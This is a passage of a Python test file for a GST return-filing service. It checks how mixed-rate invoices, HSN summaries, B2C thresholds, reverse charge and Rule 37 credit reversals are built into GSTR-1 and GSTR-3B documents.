    it: ``_rate_of`` derived one rate from the totals and snapped it to the
    nearest real slab, producing a line whose tax is not its rate applied to its
    value. The portal rejects that on upload.
    """

    def mixed(self, **kwargs) -> Invoice:
        """₹50,000 at 5% and ₹50,000 at 18%, sold within Maharashtra.

        ₹2,500 + ₹9,000 = ₹11,500 of tax on ₹1,00,000, which is 11.5% — not a
        slab, and nearest to 12%.
        """
        defaults = dict(
            tax_rate=None,
            cgst=Decimal("5750.00"),
            sgst=Decimal("5750.00"),
            igst=Decimal("0.00"),
            total_value=Decimal("111500.00"),
            line_items=[
                {
                    "description": "Printed books",
                    "hsn_code": "49019900",
                    "quantity": 40,
                    "taxable_value": 50000,
                    "tax_rate": 5,
                },
                {
                    "description": "Laptop stands",
                    "hsn_code": "84713010",
                    "quantity": 10,
                    "taxable_value": 50000,
                    "tax_rate": 18,
                },
            ],
        )
        defaults.update(kwargs)
        return local_sale(**defaults)

    def test_without_the_breakdown_it_would_be_filed_at_a_rate_it_is_not(self):
        """The failure this exists to prevent, pinned so it stays prevented."""
        assert filing_service._rate_of(self.mixed(line_items=None)) == Decimal("12")

    def test_the_b2b_block_carries_one_item_per_rate(self, db_session, business):
        save(db_session, business.id, self.mixed())

        document = filing_service.build_gstr1(db_session, business, PERIOD)

        items = document["b2b"][0]["inv"][0]["itms"]
        assert [item["num"] for item in items] == [1, 2]
        assert [item["itm_det"]["rt"] for item in items] == [5.0, 18.0]

    def test_each_item_carries_the_tax_its_own_rate_produces(self, db_session, business):
        """Which is the whole point: the portal cross-foots rate against tax."""
        save(db_session, business.id, self.mixed())

        document = filing_service.build_gstr1(db_session, business, PERIOD)

        five, eighteen = document["b2b"][0]["inv"][0]["itms"]
        assert five["itm_det"]["txval"] == 50000.00
        assert five["itm_det"]["camt"] == 1250.00
        assert five["itm_det"]["samt"] == 1250.00
        assert eighteen["itm_det"]["txval"] == 50000.00
        assert eighteen["itm_det"]["camt"] == 4500.00
        assert eighteen["itm_det"]["samt"] == 4500.00

    def test_the_items_still_add_up_to_the_invoice(self, db_session, business):
        """A block that does not foot is a rejected upload, whatever its rates."""
        save(db_session, business.id, self.mixed())

        document = filing_service.build_gstr1(db_session, business, PERIOD)

        items = document["b2b"][0]["inv"][0]["itms"]
        assert sum(item["itm_det"]["txval"] for item in items) == 100000.00
        assert sum(item["itm_det"]["camt"] for item in items) == 5750.00
        assert sum(item["itm_det"]["samt"] for item in items) == 5750.00

    def test_the_hsn_summary_splits_by_line_rather_than_by_invoice(
        self, db_session, business
    ):
        """Table 12 is rate-wise too, and each line has its own HSN.

        Rolled up to the invoice, both lines were reported under whichever HSN
        the parser happened to put in the invoice-level field, at a rate neither
        of them carried.
        """
        save(db_session, business.id, self.mixed())

        document = filing_service.build_gstr1(db_session, business, PERIOD)

        data = {entry["hsn_sc"]: entry for entry in document["hsn"]["data"]}
        assert data["49019900"]["rt"] == 5.0
        assert data["49019900"]["txval"] == 50000.00
        assert data["49019900"]["camt"] == 1250.00
        assert data["84713010"]["rt"] == 18.0
        assert data["84713010"]["camt"] == 4500.00

    def test_a_line_hsn_as_the_model_wrote_it_is_filed_as_the_portal_takes_it(
        self, db_session, business
    ):
        """P22 M2: line-item codes come from the model unchecked and went into
        ``hsn_sc`` as written; the invoice's own code was already normalised."""
        lines = self.mixed().line_items
        lines[0]["hsn_code"] = "HSN 4901.99.00"
        lines[1]["hsn_code"] = "see attached schedule"
        save(db_session, business.id, self.mixed(line_items=lines, hsn_code="8471"))

        document = filing_service.build_gstr1(db_session, business, PERIOD)

        codes = {entry["hsn_sc"]: entry["rt"] for entry in document["hsn"]["data"]}
        # Normalised; and the unreadable one falls back to the invoice's code.
        assert codes == {"49019900": 5.0, "8471": 18.0}

    def test_the_hsn_summary_reports_the_quantity_the_lines_carry(
        self, db_session, business
    ):
        """`qty` is 0 only when nothing was extracted; a line item carries one."""
        save(db_session, business.id, self.mixed())

        document = filing_service.build_gstr1(db_session, business, PERIOD)

        data = {entry["hsn_sc"]: entry for entry in document["hsn"]["data"]}
        assert data["49019900"]["qty"] == 40
        assert data["84713010"]["qty"] == 10

    def test_a_b2c_sale_lands_in_one_b2cs_bucket_per_rate(self, db_session, business):
        save(db_session, business.id, self.mixed(counterparty_gstin=None))

        document = filing_service.build_gstr1(db_session, business, PERIOD)

        buckets = {bucket["rt"]: bucket for bucket in document["b2cs"]}
        assert set(buckets) == {5.0, 18.0}
        assert buckets[5.0]["txval"] == 50000.00
        assert buckets[18.0]["camt"] == 4500.00

    def test_two_lines_on_one_rate_are_one_item_but_two_hsn_rows(
        self, db_session, business
    ):
        """`itms` is rate-wise; the HSN table is finer than that."""
        save(
            db_session,
            business.id,
            self.mixed(
                line_items=[
                    {"hsn_code": "49019900", "taxable_value": 25000, "tax_rate": 5},
                    {"hsn_code": "49029000", "taxable_value": 25000, "tax_rate": 5},
                    {"hsn_code": "84713010", "taxable_value": 50000, "tax_rate": 18},
                ]
            ),
        )

        document = filing_service.build_gstr1(db_session, business, PERIOD)

        items = document["b2b"][0]["inv"][0]["itms"]
        assert [item["itm_det"]["rt"] for item in items] == [5.0, 18.0]
        assert items[0]["itm_det"]["txval"] == 50000.00
        assert len(document["hsn"]["data"]) == 3

    def test_validation_now_objects_to_the_blended_rate(self):
        """With no usable breakdown, the invoice still files at a snapped rate.

        Nothing said so before: the arithmetic check only ran when a rate was
        stored, so the invoices whose rate could not be read were also the ones
        whose tax was never verified.
        """
        assert issues_for(self.mixed(line_items=None)) == {"tax_rate": Severity.ERROR}

    def test_the_message_names_the_rate_it_would_be_filed_at(self):
        (issue,) = filing_service.validate_invoice(
            self.mixed(line_items=None), business_state="27", period=PERIOD
        )
        assert "12%" in issue.message

    def test_a_usable_breakdown_validates_clean(self):
        assert issues_for(self.mixed()) == {}

    def test_a_breakdown_that_does_not_tie_to_the_invoice_is_not_used(self):
        """Rate-wise lines that do not add up to their invoice are worse than none.

        They would file a block footing to something other than the document it
        sits under, which is a rejected upload rather than a wrong figure. So
        the invoice falls back — and the fallback's blended rate is then caught
        by validation, which is the outcome the user can act on.
        """
        invoice = self.mixed(
            line_items=[
                {"hsn_code": "49019900", "taxable_value": 10, "tax_rate": 5},
                {"hsn_code": "84713010", "taxable_value": 20, "tax_rate": 18},
            ]
        )
        assert filing_service._line_item_rate_lines(invoice) is None
        assert issues_for(invoice) == {"tax_rate": Severity.ERROR}

    @pytest.mark.parametrize(
        "items",
        [
            pytest.param(
                [{"taxable_value": 50000, "tax_rate": 5},
                 {"taxable_value": 50000, "tax_rate": 17}],
                id="a rate that is not a slab",
            ),
            pytest.param(
                [{"taxable_value": 50000, "tax_rate": 5},
                 {"taxable_value": "n/a", "tax_rate": 18}],
                id="an unreadable value",
            ),
            pytest.param(
                [{"taxable_value": 50000, "tax_rate": 5}, "Laptop stands"],
                id="a line that is not an object",
            ),
            pytest.param(
                [{"taxable_value": 50000, "tax_rate": 5},
                 {"taxable_value": -50000, "tax_rate": 18}],
                id="a negative value",
            ),
        ],
    )
    def test_a_breakdown_with_a_bad_line_is_not_used(self, items):
        """All of it or none of it. Half a breakdown does not foot either."""
        assert filing_service._line_item_rate_lines(self.mixed(line_items=items)) is None

    def test_a_breakdown_that_is_not_a_list_of_lines_is_not_a_breakdown(self):
        """``line_items`` is a JSON column: what comes back is what was written.

        A number, an object, or nothing at all is not a breakdown, and each has
        to be refused before the loop reaches it rather than by whatever the
        loop happens to do with it.
        """
        for value in (5, {"taxable_value": 50000, "tax_rate": 5}, [], None):
            assert (
                filing_service._line_item_rate_lines(self.mixed(line_items=value)) is None
            ), value

    def test_a_line_worth_nothing_does_not_discard_the_breakdown(self):
        """A free sample on a slab the invoice already carries is a real line.

        There is nothing wrong with it — no value to add and no tax to
        apportion — and dropping the whole breakdown over it files the invoice
        at the blended rate this class exists to avoid.
        """
        invoice = self.mixed(
            line_items=[
                {"hsn_code": "49019900", "taxable_value": 50000, "tax_rate": 5},
                {"hsn_code": "84713010", "taxable_value": 50000, "tax_rate": 18},
                {"hsn_code": "84713010", "taxable_value": 0, "tax_rate": 18},
            ]
        )

        lines = filing_service._line_item_rate_lines(invoice)

        assert [line.rate for line in lines] == [Decimal("5"), Decimal("18")]

    def test_a_rupee_between_the_breakdown_and_the_invoice_is_absorbed(self):
        """The lines are what the document printed, the invoice what it totals.

        Within the tolerance the gap is the paper's own rounding, and it goes
        to the largest line so the block still foots to the invoice exactly —
        which is the thing the portal cross-checks.
        """
        invoice = self.mixed(
            line_items=[
                {"hsn_code": "49019900", "taxable_value": 50000, "tax_rate": 5},
                {"hsn_code": "84713010", "taxable_value": 49999, "tax_rate": 18},
            ]
        )

        lines = filing_service._line_item_rate_lines(invoice)

        assert [line.taxable_value for line in lines] == [
            Decimal("50001.00"),
            Decimal("49999.00"),
        ]

    def test_the_tax_is_split_by_the_tax_each_line_implies(self):
        """₹20,000 at 5% and ₹80,000 at 18% do not share their tax evenly.

        The weight is rate applied to value — ₹1,000 against ₹14,400 — because
        that is the tax each line is actually carrying. Weighted any other way
        the lines foot to the invoice and still declare tax that is not their
        own rate applied to their own value, which is what ``itms`` is checked
        for on upload.
        """
        invoice = self.mixed(
            cgst=Decimal("7700.00"),
            sgst=Decimal("7700.00"),
            total_value=Decimal("115400.00"),
            line_items=[
                {"hsn_code": "49019900", "taxable_value": 20000, "tax_rate": 5},
                {"hsn_code": "84713010", "taxable_value": 80000, "tax_rate": 18},
            ],
        )

        lines = filing_service._line_item_rate_lines(invoice)

        assert [line.cgst for line in lines] == [Decimal("500.00"), Decimal("7200.00")]
        assert [line.sgst for line in lines] == [Decimal("500.00"), Decimal("7200.00")]
        assert issues_for(invoice) == {}

    def test_two_lines_on_one_rate_are_ordered_by_their_hsn_code(self):
        """The order is (rate, HSN), and the second half is not decoration.

        ``itms`` folds by rate, but the HSN summary filed beside it does not,
        so these lines keep their own identity all the way into the return.
        Ordered by whatever the extraction happened to list first, the same
        invoice generates a different document each time it is regenerated.
        """
        invoice = self.mixed(
            line_items=[
                {"hsn_code": "99999999", "taxable_value": 25000, "tax_rate": 5},
                {"hsn_code": "11111111", "taxable_value": 25000, "tax_rate": 5},
                {"hsn_code": "84713010", "taxable_value": 50000, "tax_rate": 18},
            ]
        )

        lines = filing_service._line_item_rate_lines(invoice)

        assert [line.hsn_code for line in lines] == ["11111111", "99999999", "84713010"]

    def test_a_single_rate_breakdown_is_left_alone(self):
        """It tells the return nothing the invoice did not already say.

        And the extraction's per-line values are the less trustworthy half of
        what it read, so the invoice-level totals keep the last word.
        """
        invoice = self.mixed(
            cgst=Decimal("9000.00"),
            sgst=Decimal("9000.00"),
            total_value=Decimal("118000.00"),
            line_items=[
                {"hsn_code": "84713010", "taxable_value": 50000, "tax_rate": 18},
                {"hsn_code": "84713010", "taxable_value": 50000, "tax_rate": 18},
            ],
        )
        assert filing_service._line_item_rate_lines(invoice) is None

    def test_a_rate_somebody_typed_in_beats_the_breakdown(self):
        """`line_items` cannot be edited; `tax_rate` is the field that can.

        So a rate stored over a mixed breakdown is a person correcting the
        extraction while looking at the paper, and it wins. Not quietly: the
        tax then does not match the rate, which validation says out loud.
        """
        invoice = self.mixed(tax_rate=Decimal("18"))

        assert filing_service._line_item_rate_lines(invoice) is None
        assert [line.rate for line in filing_service.rate_lines(invoice)] == [Decimal("18")]
        assert issues_for(invoice) == {"tax_rate": Severity.ERROR}

    def test_a_rupee_of_rounding_between_lines_and_invoice_is_absorbed(self):
        """And lands on the largest line, so the block still foots exactly."""
        invoice = self.mixed(
            line_items=[
                {"hsn_code": "49019900", "taxable_value": "49999.50", "tax_rate": 5},
                {"hsn_code": "84713010", "taxable_value": "50000.00", "tax_rate": 18},
            ]
        )
        lines = filing_service.rate_lines(invoice)
        assert sum(line.taxable_value for line in lines) == Decimal("100000.00")
        assert sum(line.cgst for line in lines) == Decimal("5750.00")

    def test_a_breakdown_whose_rates_do_not_produce_the_invoice_s_tax_is_an_error(self):
        """The lines add up to the invoice's value but not to its tax.

        Filable — the block foots — and wrong, so it is reported rather than
        silently uploaded for the portal to reject.
        """
        invoice = self.mixed(
            cgst=Decimal("5000.00"),
            sgst=Decimal("5000.00"),
            total_value=Decimal("110000.00"),
        )
        (issue,) = filing_service.validate_invoice(
            invoice, business_state="27", period=PERIOD
        )
        assert issue.field == "tax_rate"
        assert "5%, 18%" in issue.message

    def test_a_line_with_no_hsn_anywhere_is_left_out_of_the_summary(
        self, db_session, business
    ):
        """A missing HSN is a warning, not a licence to invent one for table 12."""
        save(
            db_session,
            business.id,
            self.mixed(
                hsn_code=None,
                line_items=[
                    {"taxable_value": 50000, "tax_rate": 5},
                    {"hsn_code": "84713010", "taxable_value": 50000, "tax_rate": 18},
                ],
            ),
        )

        document = filing_service.build_gstr1(db_session, business, PERIOD)

        (entry,) = document["hsn"]["data"]
        assert entry["hsn_sc"] == "84713010"

    def test_the_csv_still_reports_the_invoice_as_one_row(self, db_session, business):
        """The CSV is a purchase register, not a return. One document, one row."""
        save(db_session, business.id, self.mixed())

        rows = list(
            csv.DictReader(
                io.StringIO(
                    filing_service.to_csv(
                        db_session, business, PERIOD, InvoiceType.SALES
                    )
                )
            )
        )

        assert len(rows) == 1
        assert rows[0]["taxable_value"] == "100000.00"


class TestSplittingAnAmountAcrossRates:
    """``_allocate`` is where the rate-wise block is made to foot."""

    def test_the_parts_add_back_up_to_the_whole(self):
        parts = filing_service._allocate(
            Decimal("100.00"), [Decimal("1"), Decimal("1"), Decimal("1")]
        )
        assert sum(parts) == Decimal("100.00")
        # The residual lands on the largest share, and the first of equals.
        assert parts == [Decimal("33.34"), Decimal("33.33"), Decimal("33.33")]

    def test_nothing_to_split_splits_into_nothing(self):
        assert filing_service._allocate(ZERO, [Decimal("1"), Decimal("2")]) == [ZERO, ZERO]

    def test_weightless_lines_leave_the_amount_whole(self):
        """Every line nil-rated: there is no proportion to divide by.

        Spreading it evenly would be inventing a split the figures do not
        support, so it stays where it can be seen.
        """
        assert filing_service._allocate(Decimal("50.00"), [ZERO, ZERO]) == [
            Decimal("50.00"),
            ZERO,
        ]


class TestTheB2CLThreshold:
    """Notification 12/2024-CT lowered it from ₹2.5 lakh to ₹1 lakh.

    An inter-state B2C supply above the limit is reported invoice by invoice
    rather than summarised, so the limit decides which block a supply lands in
    — and the product was still using a figure two and a half times too high,
    dropping the invoice-level detail on everything between the two.
    """

    def large_b2c(self, **kwargs) -> Invoice:
        """₹1.5 lakh plus 18%: over the new limit, under the old one."""
        defaults = dict(
            counterparty_gstin=None,
            place_of_supply="29",
            taxable_value=Decimal("150000.00"),
            igst=Decimal("27000.00"),
            total_value=Decimal("177000.00"),
        )
        defaults.update(kwargs)
        return sale(**defaults)

    def test_a_supply_between_the_two_limits_is_now_listed(self, db_session, business):
        save(db_session, business.id, self.large_b2c())

        document = filing_service.build_gstr1(db_session, business, PERIOD)

        assert "b2cs" not in document
        assert document["b2cl"][0]["inv"][0]["val"] == 177000.00

    def test_a_period_filed_under_the_old_limit_reproduces_what_was_filed(
        self, db_session, business
    ):
        """Re-generating an old return must not restate it.

        The same reason ``build_gstr3b`` anchors Rule 37 to the close of the
        period rather than to today.
        """
        old = "2024-08"
        save(
            db_session,
            business.id,
            self.large_b2c(invoice_date=date(2024, 8, 15), period=old),
        )

        document = filing_service.build_gstr1(db_session, business, old)

        assert "b2cl" not in document
        assert document["b2cs"][0]["txval"] == 150000.00

    def test_the_limit_moves_with_the_period(self):
        assert filing_service.b2cl_threshold("2024-10") == Decimal("250000.00")
        assert filing_service.b2cl_threshold("2024-11") == Decimal("100000.00")
        assert filing_service.b2cl_threshold("2026-04") == Decimal("100000.00")


def test_gstr1_summarises_hsn_by_code_and_rate(db_session, business):
    save(db_session, business.id, sale(invoice_number="S-1"))
    save(db_session, business.id, sale(invoice_number="S-2"))
    save(db_session, business.id, sale(invoice_number="S-3", hsn_code="61091000"))

    document = filing_service.build_gstr1(db_session, business, PERIOD)

    data = {entry["hsn_sc"]: entry for entry in document["hsn"]["data"]}
    assert data["84713010"]["txval"] == 200000.00
    assert data["84713010"]["iamt"] == 36000.00
    assert data["61091000"]["txval"] == 100000.00
    assert [entry["num"] for entry in document["hsn"]["data"]] == [1, 2]


def test_gstr1_derives_a_missing_rate_from_the_figures(db_session, business):
    """A parsed invoice often has the amounts but no explicit rate."""
    save(db_session, business.id, sale(tax_rate=None))

    document = filing_service.build_gstr1(db_session, business, PERIOD)

    assert document["b2b"][0]["inv"][0]["itms"][0]["itm_det"]["rt"] == 18.0


def test_gstr1_omits_empty_blocks(db_session, business):
    document = filing_service.build_gstr1(db_session, business, PERIOD)

    assert set(document) == {"gstin", "fp", "version", "hash"}


def test_gstr1_ignores_purchases_and_failed_extractions(db_session, business):
    save(db_session, business.id, sale(invoice_type=InvoiceType.PURCHASE))
    save(db_session, business.id, sale(invoice_number="S-9", status=InvoiceStatus.FAILED))

    document = filing_service.build_gstr1(db_session, business, PERIOD)

    assert "b2b" not in document


# ---------------------------------------------------------------------------
# GSTR-3B
# ---------------------------------------------------------------------------

def test_gstr3b_reports_outward_supplies_and_tax(db_session, business):
    save(db_session, business.id, sale())
    document = filing_service.build_gstr3b(db_session, business, PERIOD)

    assert document["gstin"] == BUSINESS_GSTIN
    assert document["ret_period"] == "042026"
    outward = document["sup_details"]["osup_det"]
    assert outward["txval"] == 100000.00
    assert outward["iamt"] == 18000.00


def test_gstr3b_separates_nil_and_exempt_supplies(db_session, business):
    save(db_session, business.id, sale())
    save(
        db_session,
        business.id,
        sale(
            invoice_number="E-1",
            tax_rate=Decimal("0"),
            igst=Decimal("0.00"),
            taxable_value=Decimal("40000.00"),
            total_value=Decimal("40000.00"),
        ),
    )

    document = filing_service.build_gstr3b(db_session, business, PERIOD)

    assert document["sup_details"]["osup_det"]["txval"] == 100000.00
    assert document["sup_details"]["osup_nil_exmp"]["txval"] == 40000.00


def test_gstr3b_lists_interstate_supplies_to_unregistered_persons(db_session, business):
    save(
        db_session,
        business.id,
        sale(counterparty_gstin=None, place_of_supply="29"),
    )

    document = filing_service.build_gstr3b(db_session, business, PERIOD)

    (row,) = document["inter_sup"]["unreg_details"]
    assert row["pos"] == "29"
    assert row["txval"] == 100000.00
    assert row["iamt"] == 18000.00


class TestTheTwoReturnsAgreeOnWhoIsRegistered:
    """GSTR-1's B2C blocks and GSTR-3B's table 3.2 describe the same supplies.

    The portal cross-checks 3.2 against the B2CL and B2CS blocks of the GSTR-1
    for the same period, so a supply the two returns classify differently is a
    query waiting to be raised.

    A customer GSTIN that does not checksum is where they disagreed. GSTR-1 has
    always filed it as B2C — the portal cannot attribute a supply to a taxpayer
    it cannot identify, so there is no b2b block to put it in — while 3.2 asked
    only whether the field was *filled in*, and quietly left the supply out.
    Validation calls the bad GSTIN an error either way, but an export does not
    wait for validation to pass, and it is the export that gets uploaded.
    """

    # Right shape, wrong check digit: 27AAPFU0939F1ZV is the tenant's own, and
    # the last character is what a transposition in a phone number field eats.
    UNCHECKSUMMED = "29AAGCB7383J1ZZ"

    def sale_to_an_unidentifiable_buyer(self, db, business):
        save(
            db,
            business.id,
            sale(counterparty_gstin=self.UNCHECKSUMMED, place_of_supply="29"),
        )

    def test_gstr1_files_it_as_b2c(self, db_session, business):
        self.sale_to_an_unidentifiable_buyer(db_session, business)

        document = filing_service.build_gstr1(db_session, business, PERIOD)

        # Inter-state and over the ₹1 lakh limit, so B2CL rather than the
        # rate-wise summary — either way, not b2b.
        assert "b2b" not in document
        (block,) = document["b2cl"]
        assert block["pos"] == "29"
        assert block["inv"][0]["val"] == 118000.00

    def test_gstr3b_reports_it_in_table_3_2_too(self, db_session, business):
        self.sale_to_an_unidentifiable_buyer(db_session, business)

        document = filing_service.build_gstr3b(db_session, business, PERIOD)

        (row,) = document["inter_sup"]["unreg_details"]
        assert row["pos"] == "29"
        assert row["txval"] == 100000.00
        assert row["iamt"] == 18000.00

    def test_a_registered_buyer_stays_out_of_table_3_2(self, db_session, business):
        """The other direction: 3.2 is B2C only, and a real GSTIN is not."""
        save(db_session, business.id, sale())

        document = filing_service.build_gstr3b(db_session, business, PERIOD)

        assert document["inter_sup"]["unreg_details"] == []


def test_gstr3b_table_4_carries_available_reversed_and_net_itc(db_session, business):
    save(
        db_session,
        business.id,
        sale(
            invoice_type=InvoiceType.PURCHASE,
            invoice_number="P-1",
            igst=Decimal("18000.00"),
        ),
    )

    document = filing_service.build_gstr3b(db_session, business, PERIOD)

    itc = document["itc_elg"]
    assert itc["itc_avl"][0]["iamt"] == 18000.00
    assert itc["itc_rev"][0]["iamt"] == 0.0
    assert itc["itc_net"]["iamt"] == 18000.00


def test_gstr3b_carries_the_set_off_for_the_screen(db_session, business):
    save(db_session, business.id, sale())
    document = filing_service.build_gstr3b(db_session, business, PERIOD)

    assert "gstbot_set_off" in document
    assert document["gstbot_set_off"]["cash_payable"]["igst"] == "18000.00"


class TestReverseChargeReachesTheReturn:
    """Table 3.1(d), and the credit for it at 4(A)(3).

    A business paying a goods transport agency, a lawyer, or rent to an
    unregistered landlord owes the tax itself under s.9(3)/9(4). It used to
    file a 3B declaring none of it — and that tax cannot be settled from the
    credit ledger, so the omission is cash never paid with interest running on
    it from the due date.
    """

    def purchase(self, **kwargs):
        return sale(
            invoice_type=InvoiceType.PURCHASE,
            invoice_number="P-RCM",
            reverse_charge=True,
            **kwargs,
        )

    def test_the_liability_is_declared_at_3_1_d(self, db_session, business):
        save(db_session, business.id, self.purchase())

        document = filing_service.build_gstr3b(db_session, business, PERIOD)

        inward = document["sup_details"]["isup_rev"]
        assert inward["txval"] == 100000.00
        assert inward["iamt"] == 18000.00

    def test_the_credit_is_claimed_in_its_own_row_at_4_a_3(self, db_session, business):
        save(db_session, business.id, self.purchase())

        document = filing_service.build_gstr3b(db_session, business, PERIOD)

        rows = {row["ty"]: row for row in document["itc_elg"]["itc_avl"]}
        assert rows["ISRC"]["iamt"] == 18000.00
        # Not folded into "all other ITC", which is the pool the supplier's own
        # filing evidences.
        assert rows["OTH"]["iamt"] == 0.0
        assert document["itc_elg"]["itc_net"]["iamt"] == 18000.00

    def test_a_period_with_none_declares_zeros(self, db_session, business):
        save(db_session, business.id, sale())

        document = filing_service.build_gstr3b(db_session, business, PERIOD)

        assert document["sup_details"]["isup_rev"]["txval"] == 0.0
        assert document["gstbot_cash_payable"] == "18000.00"

    def test_the_cash_figure_carries_both_liabilities(self, db_session, business):
        """The set-off's half alone tells a business to find too little money."""
        save(db_session, business.id, sale())  # ₹18,000 of output tax.
        save(db_session, business.id, self.purchase())  # ₹18,000, and its credit.

        document = filing_service.build_gstr3b(db_session, business, PERIOD)

        # The reverse-charge credit settles the output tax...
        assert document["gstbot_set_off"]["total_cash"] == "0.00"
        # ...and the reverse-charge tax is still payable in cash.
        assert document["gstbot_reverse_charge"]["cash_payable"] == "18000.00"
        assert document["gstbot_cash_payable"] == "18000.00"


class TestAClosedPeriodsReturnDoesNotMove:
    """A GSTR-3B for a month that has ended must read the same next year.

    Rule 37 is a clock: credit reverses 180 days after the invoice date. Read
    off *today* rather than off the period, the reversal in table 4(B) grew
    every time the document was generated — so a business that exported its
    January return in February and again in March had two different documents
    for one filing, and no way to tell which one went to the portal.
    """

    def purchase(self, db, business, **kwargs):
        return save(
            db,
            business.id,
            sale(invoice_type=InvoiceType.PURCHASE, **kwargs),
        )

    def test_the_same_period_builds_the_same_document_a_year_later(
        self, db_session, business, monkeypatch
    ):
        self.purchase(
            db_session, business, invoice_number="P-1", igst=Decimal("18000.00")
        )

        monkeypatch.setattr(gst_calendar, "today_ist", lambda: date(2026, 5, 2))
        just_after = filing_service.build_gstr3b(db_session, business, PERIOD)

        monkeypatch.setattr(gst_calendar, "today_ist", lambda: date(2027, 6, 2))
        much_later = filing_service.build_gstr3b(db_session, business, PERIOD)

        assert just_after == much_later

    def test_a_purchase_made_after_the_period_is_not_reversed_in_it(
        self, db_session, business, monkeypatch
    ):
        """The worst of it: credit reversed on an invoice that did not exist.

        A purchase dated five months after the period is unpaid and long past
        180 days by the time anyone regenerates the return — but it belongs to
        its own period's 3B, not to this one's.
        """
        self.purchase(
            db_session, business, invoice_number="P-APR", igst=Decimal("18000.00")
        )
        self.purchase(
            db_session,
            business,
            invoice_number="P-SEP",
            invoice_date=date(2026, 9, 10),
            period="2026-09",
            igst=Decimal("50000.00"),
        )

        monkeypatch.setattr(gst_calendar, "today_ist", lambda: date(2027, 6, 2))
        document = filing_service.build_gstr3b(db_session, business, PERIOD)

        assert document["itc_elg"]["itc_rev"][0]["iamt"] == 0.0
        assert document["itc_elg"]["itc_net"]["iamt"] == 18000.00

    def test_credit_that_had_genuinely_lapsed_by_the_period_end_is_reversed(
        self, db_session, business, monkeypatch
    ):
        """Anchoring the clock must not stop it.

        A purchase from the previous October is 181 days old on 30 April, so
        the reversal belongs in this period's return whichever day it is built.
        """
        self.purchase(
            db_session,
            business,
            invoice_number="P-OCT",
            invoice_date=date(2025, 10, 31),
            period="2025-10",
            igst=Decimal("9000.00"),
        )

        monkeypatch.setattr(gst_calendar, "today_ist", lambda: date(2026, 5, 2))
        document = filing_service.build_gstr3b(db_session, business, PERIOD)

        assert document["itc_elg"]["itc_rev"][0]["iamt"] == 9000.00

    def test_previewing_a_month_still_running_does_not_reverse_early(
        self, db_session, business, monkeypatch
    ):
        """The anchor is the period's end or today, whichever came first.

        Looking at the current month on the 2nd must not answer as if the 30th
        had already happened — that reverses credit on an invoice with four
        weeks left to run.
        """
        self.purchase(
            db_session,
            business,
            invoice_number="P-OCT",
            # 180 days after this falls on 2026-04-29: inside the period, but
            # still ahead of the 2nd.
            invoice_date=date(2025, 10, 31),
            period="2025-10",
            igst=Decimal("9000.00"),
        )

        monkeypatch.setattr(gst_calendar, "today_ist", lambda: date(2026, 4, 2))
        document = filing_service.build_gstr3b(db_session, business, PERIOD)

        assert document["itc_elg"]["itc_rev"][0]["iamt"] == 0.0

    def test_the_next_month_s_return_does_not_reverse_it_again(
        self, db_session, business, monkeypatch
    ):
        """Rule 37 is paid once, in the return for the month the clock expired.

        Anchoring the clock to the period stopped the *same* return moving.
        It did nothing about the reversal reappearing in every return after
        it: the April 3B gave back ₹9,000, and so did May's, and June's, and
        every one after that. A business filing four months handed back four
        times what the rule asks for, and each of those returns still
        reproduced itself exactly, which is what kept it invisible.
        """
        self.purchase(
            db_session,
            business,
            invoice_number="P-OCT",
            # The 181st day is 2026-04-30 — inside PERIOD and no other month.
            invoice_date=date(2025, 10, 31),
            period="2025-10",
            igst=Decimal("9000.00"),
        )

        monkeypatch.setattr(gst_calendar, "today_ist", lambda: date(2027, 6, 2))
        april = filing_service.build_gstr3b(db_session, business, PERIOD)
        may = filing_service.build_gstr3b(db_session, business, "2026-05")
        september = filing_service.build_gstr3b(db_session, business, "2026-09")

        assert april["itc_elg"]["itc_rev"][0]["iamt"] == 9000.00
        assert may["itc_elg"]["itc_rev"][0]["iamt"] == 0.0
        assert september["itc_elg"]["itc_rev"][0]["iamt"] == 0.0

    def test_paying_the_supplier_later_does_not_rewrite_the_filed_return(
        self, db_session, business, monkeypatch
    ):
        """The last way a closed return could still move under you.

        The clock was anchored to the period; ``paid_at`` was not. It was read
        as a plain flag, so settling the invoice in June deleted April's
        reversal — retrospectively, out of a return that had already been filed
        with it. Under-reversed credit is over-claimed credit, and the
        difference carries interest.

        Worse than a wrong preview, because ``record_filing`` stores the return
        as this module builds it *now*: adding the ARN a week later rewrote the
        stored copy of a filing that had already happened.
        """
        invoice = self.purchase(
            db_session,
            business,
            invoice_number="P-OCT",
            # The 181st day is 2026-04-30 — inside PERIOD and no other month.
            invoice_date=date(2025, 10, 31),
            period="2025-10",
            igst=Decimal("9000.00"),
        )

        monkeypatch.setattr(gst_calendar, "today_ist", lambda: date(2026, 5, 2))
        as_filed = filing_service.build_gstr3b(db_session, business, PERIOD)

        # The supplier is paid in June, which re-avails the credit — in June.
        invoice.paid_at = date(2026, 6, 15)
        db_session.commit()

        monkeypatch.setattr(gst_calendar, "today_ist", lambda: date(2026, 7, 2))
        regenerated = filing_service.build_gstr3b(db_session, business, PERIOD)

        assert as_filed["itc_elg"]["itc_rev"][0]["iamt"] == 9000.00
        assert regenerated == as_filed

    def test_a_payment_inside_the_period_is_still_seen_by_its_return(
        self, db_session, business, monkeypatch
    ):
        """Anchoring the payment must not blind the return to one it should see.

        Paid before the 180 days ran out, so there is nothing for this period
        to reverse — the same answer whenever it is asked.
        """
        self.purchase(
            db_session,
            business,
            invoice_number="P-OCT",
            invoice_date=date(2025, 10, 31),
            period="2025-10",
            igst=Decimal("9000.00"),
            paid_at=date(2026, 2, 10),
        )

        monkeypatch.setattr(gst_calendar, "today_ist", lambda: date(2027, 6, 2))
        document = filing_service.build_gstr3b(db_session, business, PERIOD)

        assert document["itc_elg"]["itc_rev"][0]["iamt"] == 0.0

    def test_a_later_month_keeps_the_credit_it_earned(
        self, db_session, business, monkeypatch
    ):
        """What the repeat reversal cost: a month's credit wiped out by it."""
        self.purchase(
            db_session,
            business,
            invoice_number="P-OCT",
            invoice_date=date(2025, 10, 31),
            period="2025-10",
            igst=Decimal("9000.00"),
        )
        self.purchase(
            db_session,
            business,
            invoice_number="P-MAY",
            invoice_date=date(2026, 5, 10),
            period="2026-05",
            igst=Decimal("9000.00"),
        )

        monkeypatch.setattr(gst_calendar, "today_ist", lambda: date(2027, 6, 2))
        may = filing_service.build_gstr3b(db_session, business, "2026-05")

        assert may["itc_elg"]["itc_avl"][0]["iamt"] == 9000.00
        assert may["itc_elg"]["itc_rev"][0]["iamt"] == 0.0
        assert may["itc_elg"]["itc_net"]["iamt"] == 9000.00

    def test_available_less_reversed_is_still_the_net(
        self, db_session, business, monkeypatch
    ):
